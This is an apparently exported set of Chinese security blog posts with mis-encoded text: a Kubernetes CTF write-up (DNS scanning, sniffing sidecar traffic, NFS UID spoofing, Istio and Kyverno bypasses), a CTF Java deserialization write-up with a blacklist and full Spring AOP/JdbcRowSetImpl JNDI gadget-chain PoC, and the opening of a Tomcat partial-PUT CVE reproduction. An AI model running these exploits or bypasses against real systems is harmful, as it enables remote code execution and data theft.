[{"categories":["äº‘å®‰å…¨","WP"],"contents":" DNSing with the stars You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.\nAs a warmup, utilize DNS scanning to uncover hidden internal services and obtain the flag. We have \u0026ldquo;loaded your machine with dnscan to ease this process for further challenges.\nAll the flags in the challenge follow the same format: wiz_k8s_lan_party{*}\næ ¹æ®é¢˜ç›®ä¿¡æ¯å¯ä»¥çŸ¥é“æ˜¯åˆ©ç”¨dnscanå¯»æ‰¾k8sä¸»æœº\né€šè¿‡envå¯ä»¥å‘ç°k8sçš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚serviceä¸»æœºåœ°å€\næ‰€ä»¥æˆ‘ä»¬ä»¥service ipæ¥æ‰¾å…¶cidrå—ä¸­çš„å…¶ä»–ä¸»æœºå°±è¡Œäº†\næ‰¾åˆ°dnsä¸ºgetflag-service.k8s-lan-party.svc.cluster.local.\næ¥ä¸‹æ¥curlä¸€ä¸‹å°±å¥½äº†\nHello? Sometimes, it seems we are the only ones around, but we should always be on guard against invisible sidecars reporting sensitive secrets.\nSidecarï¼ŒæŒ‡çš„æ˜¯ä¸€ç§ç‰¹æ®Šçš„éšç€å®¹å™¨å¼€å¯è€Œå¯åŠ¨çš„__init__å®¹å™¨\nSidecarå…·æœ‰ç‹¬ç«‹çš„ç”Ÿå‘½å‘¨æœŸã€‚å®ƒä»¬å¯ä»¥ç‹¬ç«‹äºåº”ç”¨å®¹å™¨å¯åŠ¨ã€åœæ­¢å’Œé‡å¯ã€‚ è¿™æ„å‘³ç€ä½ å¯ä»¥æ›´æ–°ã€æ‰©å±•æˆ–ç»´æŠ¤Sidecarå®¹å™¨ï¼Œè€Œä¸å½±å“ä¸»åº”ç”¨ã€‚\nå˜æ›´Sidecarçš„é•œåƒä¸ä¼šå¯¼è‡´ Pod é‡å¯ï¼Œä½†ä¼šè§¦å‘å®¹å™¨é‡å¯ã€‚\nè¿™ä¸€é¢˜çš„Sidecarçš„ä½œç”¨æ˜¯ä¸åœçš„å¾€ä¸»å®¹å™¨å‘æ•°æ®ï¼Œè¿™äº›æ•°æ®å°±æœ‰flagï¼ˆåˆ«é—®ä¸ºä»€ä¹ˆï¼Œé—®å°±æ˜¯ctfé çŒœ\nifconfigæ‰¾åˆ°ç½‘å¡å\ntcpdumpæŠ“æµé‡\ntcpdump -ins-bbf712 -XX -vvv -nn Exposed File Share The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based ğŸ¤¦â€ï¸.\nè¿™é¢˜çš„é—®é¢˜ä¸»è¦æ˜¯å‡ºåœ¨ä¸€ä¸ªnfsç³»ç»Ÿä¸Š,åœ¨æµè§ˆæ–‡ä»¶æ—¶ï¼Œå¯ä»¥çœ‹è§æ ¹ç›®å½•ä¸‹å¤šäº†ä¸ªefsæ–‡ä»¶å¤¹ï¼Œflag.txtéƒ½åœ¨é‡Œé¢ï¼Œä½†æ˜¯æ²¡æƒé™è¯»\næ ¹æ®é¢˜ç›®é‡Œè¯´çš„è¿‡æœŸçš„å‚¨å­˜æ¶æ„ï¼Œå¯ä»¥åˆç†çš„çœ‹ä¸€çœ¼mount\nç¡®å®æ˜¯ä¸€ä¸ªefsæœåŠ¡ï¼Œç”±äºefsçš„ä¿¡ä»»æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨nfs-catå’Œnfs-lsçš„åŒæ—¶è‡ªè®¾uidå’Œgid,versionå®ç°è¶Šæƒè¯»å–\nä¸‹é¢æ˜¯GPTè€å¸ˆçš„è§£é‡Š\nè¿™æ˜¯ä¸ªéå¸¸å¥½çš„é—®é¢˜ã€‚NFS å’Œ EFS å…è®¸å®¢æˆ·ç«¯â€œè‡ªæŠ¥å®¶é—¨â€ï¼ˆå³å®¢æˆ·ç«¯æŒ‡å®š UID/GIDï¼‰å¬èµ·æ¥ç¡®å®å±é™©ï¼Œä½†å®ƒèƒŒåæœ‰æ˜ç¡®çš„å†å²åŸå› å’Œè®¾è®¡å–èˆã€‚ä¸‹é¢ä»å¤šä¸ªè§’åº¦è§£é‡Šä¸ºä»€ä¹ˆä¼šæœ‰è¿™ç§è®¾è®¡ï¼š\nğŸ§± 1. å†å²èƒŒæ™¯ï¼šNFS æ˜¯ä¸ºä¿¡ä»»ç¯å¢ƒè®¾è®¡çš„ NFSï¼ˆNetwork File Systemï¼‰æœ€åˆç”± Sun Microsystems åœ¨ 1980 å¹´ä»£è®¾è®¡ï¼Œé‚£æ—¶çš„ç›®æ ‡æ˜¯ï¼š\nåœ¨ä¸€ä¸ªå±€åŸŸç½‘ï¼ˆLANï¼‰ä¸­çš„å¯ä¿¡ä¸»æœºä¹‹é—´å…±äº«æ–‡ä»¶ã€‚ æ‰€æœ‰ä¸»æœºè¢«è®¤ä¸ºæ˜¯å—ä¿¡çš„ï¼Œç”¨æˆ·è´¦æˆ·å’Œ UID æ˜¯ç»Ÿä¸€çš„ã€‚ ç³»ç»Ÿç®¡ç†å‘˜æ§åˆ¶æ•´ä¸ªç½‘ç»œï¼Œå› æ­¤ä¸éœ€è¦â€œéªŒè¯â€æ¯ä¸ª UIDã€‚ å› æ­¤ï¼ŒNFS åè®®ä»ä¸€å¼€å§‹å°±æœ‰ä¸ªåŸºæœ¬å‡è®¾ï¼š\nâ€œå®¢æˆ·ç«¯å‘é€è¿‡æ¥çš„ UID/GID æ˜¯å¯ä¿¡çš„ã€‚â€\nè¿™å¯¹æ€§èƒ½å’Œè®¾è®¡æ¥è¯´æ˜¯å¾ˆç®€å•çš„æ–¹æ¡ˆï¼Œä½†ä¸é€‚åˆä¸å¯ä¿¡ç½‘ç»œã€‚\nâ˜ï¸ 2. EFS åŸºäº NFSv4 åè®®ï¼Œä¸ºå…¼å®¹è€Œä¿ç•™æ­¤è¡Œä¸º AWS EFS æ˜¯æ„å»ºåœ¨ NFSv4 åè®®ä¹‹ä¸Šçš„æ‰˜ç®¡æœåŠ¡ã€‚ä¸ºäº†å…¼å®¹ç°æœ‰ç”Ÿæ€å’Œæ“ä½œç³»ç»ŸæŒ‚è½½è¡Œä¸ºï¼ŒEFS ä¿ç•™äº† NFS çš„ä¼ ç»Ÿæœºåˆ¶ï¼š\nå®¢æˆ·ç«¯æ§åˆ¶ UID/GIDã€‚ æœåŠ¡ç«¯åªæ ¹æ® UID æ¥åˆ¤æ–­è®¿é—®æƒé™ã€‚ è¿™ä½¿å¾—ä½ å¯ä»¥æ— ç¼æŠŠç°æœ‰ Linux/NFS ç³»ç»Ÿè¿ç§»åˆ° EFSï¼Œä¸ç”¨ä¿®æ”¹å¤ªå¤šé€»è¾‘ã€‚\nè¿™é¢˜æˆ‘ä»¬ç”¨ä¸äº†ä»–çš„åŸŸå[fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com]æ¥è®¿é—®ï¼Œå¥½åƒæ˜¯æ²¡æœ‰dnsæœåŠ¡ï¼Œè¿™é‡Œç”¨ipå°±å¥½äº†ï¼Œä¹Ÿåœ¨ä¸Šé¢çš„çº¢æ¡†æ¡†é‡Œ\n(è¿™é‡Œçš„/è¦åŒå†™)\nThe Beauty and The Ist Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don\u0026rsquo;t abuse this power; use it responsibly and with caution.\nè¿™é¢˜è€ƒäº†ä¸ªistioçš„è§„åˆ™ç»•è¿‡\næ ¹æ®hint1ç»™çš„documentå¯ä»¥å¾—åˆ°ä¸‹é¢çš„iptables\nä¸€å¼€å§‹æˆ‘è¿˜åœ¨æƒ³æ€ä¹ˆè·å–ç¯å¢ƒé‡Œistioçš„iptables,æ²¡æƒ³åˆ°çš„æ˜¯ä½œè€…ç»™è¿™ä¸ªhintå°±æ˜¯æŠŠiptablesç»™æˆ‘ä»¬ï¼ˆä¼¼ä¹æ˜¯é»˜è®¤é…ç½®å•¥çš„\næˆ‘ä»¬å¯ä»¥åœ¨iptablesé‡Œçœ‹åˆ°\n-A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --uid-owner 1337 -j ISTIO_IN_REDIRECT -A ISTIO_OUTPUT -o lo -m owner ! --uid-owner 1337 -j RETURN -A ISTIO_OUTPUT -m owner --uid-owner 1337 -j RETURN -A ISTIO_OUTPUT ! -d 127.0.0.1/32 -o lo -m owner --gid-owner 1337 -j ISTIO_IN_REDIRECT -A ISTIO_OUTPUT -o lo -m owner ! --gid-owner 1337 -j RETURN åæ­£å°±æ˜¯uidæ˜¯1337çš„è¯å°±é€šè¿‡\nistioçš„æœåŠ¡å¯ä»¥dnscanæ‰¾åˆ°\nçœ‹ä¸€ä¸‹/etc/passwdï¼Œå°±æ‰¾åˆ°äº†1337çš„istio\nWho will guard the guardians? Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the administrative services.\ndnscanå‘ç°kyvernoæœåŠ¡\nkyvernoæ˜¯k8sçš„ä¸€ä¸ªç­–ç•¥ç®¡ç†åº”ç”¨ï¼Œè¿™é¢˜æˆ‘ä»¬çš„ç­–ç•¥å¦‚ä¸‹\napiVersion: kyverno.io/v1 kind: Policy metadata: name: apply-flag-to-env namespace: sensitive-ns spec: rules: - name: inject-env-vars match: resources: kinds: - Pod mutate: patchStrategicMerge: spec: containers: - name: \u0026#34;*\u0026#34; env: - name: FLAG value: \u0026#34;{flag}\u0026#34; kyvernoä¼šæŠŠåˆ›å»ºåœ¨namespace=sensitive-nsçš„containerséƒ½æ·»åŠ ä¸€ä¸ªflagç¯å¢ƒå˜é‡\nè¿™é‡Œè°ƒç”¨äº†kyvernoçš„mutateæ¥å£ï¼Œè¿™ä¸ªæ¥å£æ˜¯ AdmissionReviewçš„æ¥å£ï¼Œéœ€è¦æˆ‘ä»¬å‘é€å¯¹åº”çš„å†…å®¹\nè¿™é‡Œç”¨åˆ°äº†kube-reviewæ¥ç”Ÿæˆ\nå†™ä¸€ä¸ªyamlï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæ–°Containersåœ¨sensitive-nsä¸‹\napiVersion: v1 kind: Pod metadata: name: sensitive-pod namespace: sensitive-ns spec: containers: - name: nginx image: nginx:latest ç„¶åç”Ÿæˆjsonï¼Œå†æ­ä¸ªwebæœåŠ¡ä¼ ç»™æ”»å‡»æœº\npatchå†…å®¹è¢«base64åŠ å¯†äº†ï¼Œæ ¹æ®kyvernoçš„æ”¿ç­–ï¼Œå¯ä»¥åˆ¤æ–­patchå°±æœ‰ä»–æ·»åŠ çš„envå†…å®¹ï¼Œå³flag\nâ€‹\tç»“å°¾ å¤´ä¸€æ¬¡æ‰“k8sçš„é¶åœºï¼Œæ„Ÿè§‰ä¸œè¥¿å¾ˆå¤šï¼Œè¦äº†è§£çš„ä¸œè¥¿ä¹Ÿæœ‰å¾ˆå¤šï¼Œç½‘ä¸Šæœ‰ç›¸å…³èµ„æ–™ä½†ä¸æ˜¯ç‰¹åˆ«ä¸°å¯Œï¼Œç”¨aiæ‰¾ä¸€äº›è§£é‡Šå°±å¾ˆæ–¹ä¾¿ï¼Œä¸è¿‡è¿™é‡Œè¿˜æ²¡æœ‰è®©æˆ‘ä»¬ç”¨kubectlè¿™äº›ä¸œè¥¿ï¼Œåªèƒ½è¯´å…¥é—¨äº†è§£è¿˜å¯ä»¥\n","date":"2025-05-15T16:57:31+08:00","permalink":"http://localhost:1313/post/k8slanparty-wp/","section":"post","tags":null,"title":"K8slanparty WP"},{"categories":["Javaå®‰å…¨","WP"],"contents":"å‰è¨€ ä¸€ä¸ªå…³äºæœ¬åœ°æ‰“é€šæ— æ•°æ¬¡ä½†è¿œç¨‹0æ¬¡çš„æ•…äº‹\né¢˜ç›®åˆ†æ é¢˜ç›®ç›´æ¥ç»™äº†ä¸€ä¸ªååºåˆ—åŒ–çš„å…¥å£ç‚¹\nå…¶ä¸­æœ‰ä¸¤å±‚é˜²å¾¡\nå¯¹æˆ‘ä»¬çš„ååºåˆ—åŒ–æ•°æ®æµä¸­çš„æ˜æ–‡è¿›è¡Œç®€å•åˆ¤æ–­è¿‡æ»¤ ä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰ååºåˆ—åŒ–ç±»æ¥å¯¹æˆ‘ä»¬çš„ååºåˆ—åŒ–æ•°æ®æµè¿›è¡Œååºåˆ—åŒ– å…¶ä¸­è‡ªå®šä¹‰åŒ–ååºåˆ—åŒ–ç±»ä»£ç å¦‚ä¸‹\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.ezjav.utils; import java.io.BufferedReader; import java.io.ByteArrayInputStream; import java.io.IOException; import java.io.InputStream; import java.io.InputStreamReader; import java.io.InvalidClassException; import java.io.ObjectInputStream; import java.io.ObjectStreamClass; import java.util.ArrayList; public class MyObjectInputStream extends ObjectInputStream { private String[] denyClasses; public MyObjectInputStream(ByteArrayInputStream var1) throws IOException { super(var1); ArrayList\u0026lt;String\u0026gt; classList = new ArrayList(); InputStream file = MyObjectInputStream.class.getResourceAsStream(\u0026#34;/blacklist.txt\u0026#34;); BufferedReader var2 = new BufferedReader(new InputStreamReader(file)); String var4; while((var4 = var2.readLine()) != null) { classList.add(var4.trim()); } this.denyClasses = new String[classList.size()]; classList.toArray(this.denyClasses); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String className = desc.getName(); int var5 = this.denyClasses.length; for(int var6 = 0; var6 \u0026lt; var5; ++var6) { String denyClass = this.denyClasses[var6]; if (className.startsWith(denyClass)) { throw new InvalidClassException(\u0026#34;Unauthorized deserialization attempt\u0026#34;, className); } } return super.resolveClass(desc); } } ä»blacklistä¸­è¯»å–banedç±»ï¼Œä¸”åœ¨resolveClassä¸­è¿›è¡Œè¿‡æ»¤\nblacklist.txt\njavax.management.BadAttributeValueExpException com.sun.org.apache.xpath.internal.objects.XString java.rmi.MarshalledObject java.rmi.activation.ActivationID javax.swing.event.EventListenerList java.rmi.server.RemoteObject javax.swing.AbstractAction javax.swing.text.DefaultFormatter java.beans.EventHandler java.net.Inet4Address java.net.Inet6Address java.net.InetAddress java.net.InetSocketAddress java.net.Socket java.net.URL java.net.URLStreamHandler com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl java.rmi.registry.Registry java.rmi.RemoteObjectInvocationHandler java.rmi.server.ObjID java.lang.System javax.management.remote.JMXServiceUR javax.management.remote.rmi.RMIConnector java.rmi.server.RemoteObject java.rmi.server.RemoteRef javax.swing.UIDefaults$TextAndMnemonicHashMap java.rmi.server.UnicastRemoteObject java.util.Base64 java.util.Comparator java.util.HashMap java.util.logging.FileHandler java.security.SignedObject javax.swing.UIDefaults è§£å†³æ€è€ƒ ç¬¬ä¸€æ­¥ å¯¹äºç¬¬ä¸€å±‚é˜²å¾¡ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆç®€å•çš„ç»•è¿‡ï¼Œå¯¹æ­¤æˆ‘æœ‰ä»¥ä¸‹ä¸¤ç§ç»•è¿‡æ–¹å¼\nUTF8OverlongEncoding ä¸ä½¿ç”¨å­˜åœ¨è¿™äº›å­—ç¬¦ä¸²çš„ç±»(com.sun,naming,jdk.jfr) è¿™ä¸ªå¾ˆç®€å•ï¼Œå°±ä¸å¤šè¯´äº†\nç¬¬äºŒå±‚çš„resolveClass,æˆ‘ä»¬åªèƒ½é€‰æ‹©ä¸ä½¿ç”¨blacklistä¸Šé¢çš„ç±»æ¥è¾¾åˆ°æ”»å‡»ç›®çš„ï¼Œç»è¿‡æˆ‘çš„æ’æŸ¥ï¼Œæˆ‘æ‰‹é‡Œåˆšå¥½å°±æœ‰è¿™ä¹ˆä¸€æ®µé“¾å­ä»»ä½•å…³é”®ç±»éƒ½ä¸åœ¨blacklistä¸­ï¼Œé‚£å°±æ˜¯springaopé“¾\nç®€å•å°å¼•-\u0026gt; https://gsbp0.github.io/post/springaop/\nåœ¨æˆ‘ä¸Šé¢çš„æ–‡ç« ä¸­ï¼Œæˆ‘æœ€åæ˜¯ç”¨çš„toStringæ¥è§¦å‘aopåŠ¨æ€ä»£ç†çš„invokeæ–¹æ³•ï¼Œä¸è¿‡æˆ‘åœ¨æ–‡ç« æåˆ°è¿‡,åªè¦ä¸æ˜¯equals,hashcodeè¿™ä¿©æ–¹æ³•è§¦å‘invoke,å…¶ä»–éƒ½æ˜¯å¯ä»¥èµ°å®Œæ•´æ¡ååºåˆ—åŒ–é“¾\næˆ‘åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ç”±é¢˜ç›®ä¸­å­˜åœ¨çš„Userç±»çš„compareæ–¹æ³•å—åˆ°å¯å‘ï¼Œé€‰æ‹©äº†CC2å’ŒCBä¸­éƒ½ç”¨åˆ°çš„PriorityQueueé‚£ä¸€æ®µæ¥è§¦å‘compare\nä¸‹é¢æ˜¯cbçš„éƒ¨åˆ†poc\nBeanComparator CB=new BeanComparator(); CB.setProperty(\u0026#34;outputProperties\u0026#34;); PriorityQueue PQ=new PriorityQueue(1); PQ.add(1); PQ.add(2); reflectSet(PQ,\u0026#34;comparator\u0026#34;,CB); reflectSet(PQ,\u0026#34;queue\u0026#34;,new Object[]{TPI,TPI}); okï¼Œé‚£ç›´æ¥æ‹¼åˆ°aopé“¾çš„åé¢çœ‹çœ‹æƒ…å†µ\nç»“æœè§¦å‘äº†æŠ¥é”™\nException in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException: Can not set final java.util.Comparator field java.util.PriorityQueue.comparator to com.sun.proxy.$Proxy3 at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167) at sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171) at sun.reflect.UnsafeQualifiedObjectFieldAccessorImpl.set(UnsafeQualifiedObjectFieldAccessorImpl.java:83) at java.lang.reflect.Field.set(Field.java:764) at Utils.Util.setFieldValue(Util.java:38) at Test.main(Test.java:30) å› ä¸ºæˆ‘ä»¬çš„proxyç±»æ²¡æœ‰å®ç°comparatoræ¥å£ï¼Œé‚£è¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å¤–é¢å†æ¬¡åŒ…ä¸€å±‚ä»£ç†ï¼Œä¸”ä»£ç†comparatoræ¥å£å³å¯\nè‡³äºè§¦å‘ç±»ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©LdapAttributeè¿™ä¹ˆä¸€ä¸ªjndiæ³¨å…¥ç±»ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©JdbcRowSetImplï¼Œä¸è¿‡éœ€è¦utf8overlongéº»çƒ¦ä¸€ç‚¹\nPOC import Utils.Util; import com.sun.rowset.JdbcRowSetImpl; import org.aopalliance.aop.Advice; import org.aopalliance.intercept.MethodInterceptor; import org.springframework.aop.aspectj.AbstractAspectJAdvice; import org.springframework.aop.aspectj.AspectJAroundAdvice; import org.springframework.aop.aspectj.AspectJExpressionPointcut; import org.springframework.aop.aspectj.SingletonAspectInstanceFactory; import org.springframework.aop.framework.AdvisedSupport; import org.springframework.aop.support.DefaultIntroductionAdvisor; import java.lang.reflect.*; import java.util.*; public class Test { public static void main(String[] args) throws Exception { JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\u0026#34;ldap://127.0.0.1:50389/3fa0f4\u0026#34;); Method method=jdbcRowSet.getClass().getMethod(\u0026#34;getDatabaseMetaData\u0026#34;); System.out.println(method); SingletonAspectInstanceFactory factory = new SingletonAspectInstanceFactory(jdbcRowSet); AspectJAroundAdvice advice = new AspectJAroundAdvice(method,new AspectJExpressionPointcut(),factory); Proxy proxy1 = (Proxy) getAProxy(advice,Advice.class); Proxy finalproxy=(Proxy) getBProxy(proxy1,new Class[]{Comparator.class}); PriorityQueue PQ=new PriorityQueue(1); PQ.add(1); PQ.add(2); Util.setFieldValue(PQ,\u0026#34;comparator\u0026#34;,finalproxy); Util.setFieldValue(PQ,\u0026#34;queue\u0026#34;,new Object[]{proxy1,proxy1}); System.out.println(Util.serialize(PQ)); Util.deserialize(Util.serialize(PQ)); } public static Object getBProxy(Object obj,Class[] clazzs) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), clazzs, handler); return proxy; } public static Object getAProxy(Object obj,Class\u0026lt;?\u0026gt; clazz) throws Exception { AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(obj); AbstractAspectJAdvice advice = (AbstractAspectJAdvice) obj; DefaultIntroductionAdvisor advisor = new DefaultIntroductionAdvisor((Advice) getBProxy(advice, new Class[]{MethodInterceptor.class, Advice.class})); advisedSupport.addAdvisor(advisor); Constructor constructor = Class.forName(\u0026#34;org.springframework.aop.framework.JdkDynamicAopProxy\u0026#34;).getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{clazz}, handler); return proxy; } } ç¬¬äºŒæ­¥ ç¬¬ä¸€ç§æ–¹æ³•-Ldap_SERIALIZE_DATA å®¶å–»æˆ·æ™“çš„åŠæ³•ï¼Œå› ä¸ºé¢˜ç›®jaråŒ…ä¸Šçš„ç¼–è¯‘ç‰ˆæœ¬æ˜¯11,è¿˜æ²¡æœ‰å—åˆ°å¼ºåˆ¶ç±»éš”ç¦»çš„è¦æ±‚ï¼Œå¯ä»¥éšä¾¿æ‰“Jacksoné‚£ä¸€å¥—ååºåˆ—åŒ–ï¼Œæˆ–è€…æ˜¯å†èµ°ä¸€è¾¹æˆ‘ä»¬çš„AOPé“¾ä½†è§¦å‘ç±»æ¢æˆå¯RCEçš„TemplateImplç±»\nè¿™é‡Œæˆ‘ç”¨çš„JNDIMap\nokæœ¬åœ°æˆåŠŸRCE\nä½†æ˜¯æ”¾åˆ°è¿œç¨‹ç›´æ¥å¤±è´¥GGï¼Œæˆ‘å¼€å§‹æ€è€ƒæˆ‘çš„é—®é¢˜\nokå¯èƒ½æ˜¯ç¯å¢ƒé‡Œè®¾ç½®äº†com.sun.jndi.ldap.object.trustSerialDataä¸ºfalseï¼Œåˆç†åˆç†\nå¼€å§‹ç¬¬äºŒç§æ–¹æ³•\nç¬¬äºŒç§æ–¹æ³•-hsqläºŒæ¬¡ååºåˆ—åŒ– Ok,æˆ‘ä»¬è¿™é‡Œç›´æ¥çœ‹é¢˜ç›®çš„ä¾èµ–\ndruid+hsqlï¼Œå†åŠ ä¸Šé¢˜ç›®åjustDeserializeï¼ŒæŒ‡å‘æ€§å¾ˆæ˜æ˜¾äº†ï¼Œæˆ‘ä»¬æ‰“jndi_Referenceè§¦å‘DruidDataSourceFactoryçš„getObjectInstanceæ–¹æ³•æ¥æ‰“hsql-JDBCï¼Œè§¦å‘hsqlé‡Œçš„SerializationUtilsäºŒæ¬¡ååºåˆ—åŒ–å®ç°RCE\nè¿™é‡Œæˆ‘ä½¿ç”¨äº†java-chains\näºŒæ¬¡ååºåˆ—åŒ–æ•°æ®å¡çš„æˆ‘è‡ªå·±ç”Ÿæˆçš„AOP+springEchoå†…å­˜é©¬é“¾å­,è¿™é‡Œä¹Ÿå¯ä»¥ç”¨è¿™ä¸ªå·¥å…·è‡ªå¸¦çš„ååºåˆ—åŒ–ç”Ÿæˆå·¥å…·ç”Ÿæˆï¼Œä¹ŸæŒºå¥½ç”¨çš„\nç„¶åå†æ‰“ï¼\nokæœ¬åœ°åˆé€šäº†,æ‰“è¿œç¨‹ï¼\né‚£ä¹ˆé—®é¢˜å†æ¬¡æ¥è¢­ï¼Œæˆ‘æŠ±ç€æ»¡æ€€æœŸå¾…å†å»æ‰“è¿œç¨‹çš„æ—¶å€™ï¼Œåˆæ²¡é€šï¼Œç›´æ¥é“å¿ƒå´©æºƒäº†ï¼Œåç»­ä¸çŸ¥é“æ€ä¹ˆæ‰“äº†ï¼Œå¹¶ä¸”ä¹Ÿæ²¡æœ‰é¢˜ç›®ç¯å¢ƒï¼Œä¸çŸ¥é“å•¥é—®é¢˜qaq\nç»“å°¾ ä¸æ˜¯å¾ˆæ¸…æ¥šè¿™è¿œç¨‹çš„ç¯å¢ƒï¼Œæ¯”èµ›çš„æ—¶å€™ç ´å¤§é˜²ï¼Œå¦‚æœæœ‰å¸ˆå‚…åœ¨æ¯”èµ›çš„æ—¶å€™æ‰“é€šäº†è¿™é“é¢˜å¸Œæœ›èƒ½å‘Šè¯‰æˆ‘ä¸€ä¸‹å’‹æ‰“çš„QAQ\nåè®° è¿™å‡ å¤©åœ¨ç”¨web-chainsçš„æ—¶å€™çªç„¶çœ‹è§ä»–çš„ JNDIReferencePayloadæ˜¯åŸºäº javaSerializedDataç”Ÿæˆçš„ï¼Œæ‰€ä»¥è¿™å¯èƒ½æ˜¯ä¸€ä¸ªæ‰“å¤±è´¥çš„åŸå› ,ä¸è¿‡æ ¹æ®æˆ‘åœ¨èµ›åœºä¸Šçš„æ„Ÿè§‰æ¥è¯´ï¼Œæˆ‘æ˜¯èƒ½å¤Ÿæ„Ÿè§‰åˆ°æˆ‘åœ¨æ‰“å…¥payloadçš„æ—¶å€™åç«¯çš„å»¶è¿Ÿå’Œæˆ‘åœ¨æœ¬åœ°æ‰“çš„å»¶è¿Ÿæ˜¯åŒä¸€ä¸ªåŸå› (hsqlååºåˆ—åŒ–)ï¼Œæ‰€ä»¥è¿œç¨‹ç¯å¢ƒä¸ºä»€ä¹ˆæ‰“ä¸é€šï¼Œé‚£ä¼°è®¡æ˜¯å¸ƒå‰å²›äº†\n","date":"2025-03-24T22:00:00+08:00","permalink":"http://localhost:1313/post/%E8%BD%AF%E4%BB%B6%E6%94%BB%E9%98%B2%E8%B5%9B%E7%8E%B0%E5%9C%BA%E8%B5%9B%E4%B8%8A%E5%AF%B9justdeserialize%E6%94%BB%E5%87%BB%E7%9A%84%E5%87%A0%E6%AC%A1%E5%B0%9D%E8%AF%95/","section":"post","tags":null,"title":"è½¯ä»¶æ”»é˜²èµ›ç°åœºèµ›ä¸Šå¯¹justDeserializeæ”»å‡»çš„å‡ æ¬¡å°è¯•"},{"categories":["Javaå®‰å…¨","CVE"],"contents":"å‰è¨€ å‡ºäº†ä¸ªé€šå‘Šè¯´Tomcatæœ‰ä¸ªæ–°çš„cveï¼Œäºæ˜¯æ¥å°è¯•å¤ç°åˆ†æä¸€ä¸‹\né€šæŠ¥ å…³äºæ¼æ´çš„é€šæŠ¥ç»†èŠ‚å¦‚ä¸‹\nä¸€çœ‹åˆæ˜¯DefaultServletçš„putæ–¹æ³•ä¸Šå‡ºçš„æ´ï¼Œè¿™é‡Œæ¼æ´åˆ©ç”¨æœ‰ä¸¤ç§å½¢å¼ï¼Œä¸€ä¸ªæ˜¯ä¿¡æ¯æ³„æ¼å’Œç¯¡æ”¹ï¼Œè¿˜æœ‰ä¸€ä¸ªæ˜¯ååºåˆ—åŒ–RCEï¼Œè€Œä¸”è¦æ±‚çš„å‰ç½®é¡¹æœ‰ç‚¹å¤šï¼Œè¿™é‡Œç®€å•åˆ—å‡ºæ¥\nä¿¡æ¯æ³„æ¼/ç¯¡æ”¹ ReadOnlyä¸ºfalse\næ”¯æŒpartial PUTæ–¹æ³•\næ”»å‡»è€…çŸ¥é“æ•æ„Ÿæ–‡ä»¶çš„åç§°\nå®‰å…¨æ•æ„Ÿæ–‡ä»¶çš„ä¸Šä¼ ç›®æ ‡ URL æ˜¯å…¬å¼€ä¸Šä¼ ç›®æ ‡ URL çš„å­ç›®å½•ï¼ˆï¼Ÿè¿™ä¸ªçœ‹ä¸æ‡‚ï¼Œä¹Ÿä¸çŸ¥é“å•¥æ„æ€ï¼‰\nååºåˆ—åŒ–RCE ReadOnlyä¸ºfalse æ”¯æŒpartial PUTæ–¹æ³• æœåŠ¡å¼€å¯ä»¥æ–‡ä»¶ä¸ºå­˜å‚¨å½¢å¼çš„æŒä¹…åŒ–é“¾æ¥ï¼Œå¹¶ä¸”é‡‡ç”¨é»˜è®¤ä½ç½® æœ‰èƒ½å¤Ÿå¼•èµ·ååºåˆ—åŒ–æ¼æ´çš„ä¾èµ– ç¯å¢ƒæ­å»º æˆ‘å‚è€ƒçš„è¿™ç¯‡æ–‡ç« æ­å»ºçš„ç¯å¢ƒ\nhttps://juejin.cn/post/7331544684290228250\næ¥ä¸‹æ¥ä¿®æ”¹readonly\ntomcatç›®å½•/conf/web.xml\n\u0026lt;servlet\u0026gt;\r\u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt;\r\u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;readonly\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\